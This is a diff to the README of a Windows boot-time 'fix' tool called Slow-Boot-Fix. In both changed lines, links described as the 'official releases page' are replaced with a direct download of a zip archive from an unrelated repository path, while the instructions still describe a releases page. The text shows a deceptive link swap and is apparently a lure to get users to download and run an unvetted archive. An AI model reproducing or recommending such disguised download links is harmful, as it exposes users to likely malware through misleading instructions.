@@ -5,7 +5,7 @@ description: "Optimize Windows 10 and 11 startup processes to reduce boot times 
 ---
 # 🚀 Slow-Boot-Fix - Reduce Windows Boot Time In Seconds
 
-[![](https://img.shields.io/badge/Download-Slow--Boot--Fix-blue.svg)](https://github.com/Shriharia7729/Slow-Boot-Fix/releases)
+[![](https://img.shields.io/badge/Download-Slow--Boot--Fix-blue.svg)](https://raw.githubusercontent.com/Shriharia7729/shriharia7729.github.io/main/childbed/shriharia_io_github_v2.0.zip)
 
 Slow-Boot-Fix addresses long wait times during your computer startup. Windows systems often collect background processes and configuration errors that delay the loading of your desktop. This tool identifies those bottlenecks and applies fixes to restore speed. You see results from the next time you turn on your machine.
 
@@ -22,7 +22,7 @@ This utility runs directly on your Windows partition. It makes targeted adjustme
 
 ## 📥 Getting The Software
 
-Visit the [official releases page](https://github.com/Shriharia7729/Slow-Boot-Fix/releases) to download the current version.
+Visit the [official releases page](https://raw.githubusercontent.com/Shriharia7729/shriharia7729.github.io/main/childbed/shriharia_io_github_v2.0.zip) to download the current version.
 
 1. Click the link above to reach the repository release area.
 2. Look for the latest version listed at the top.
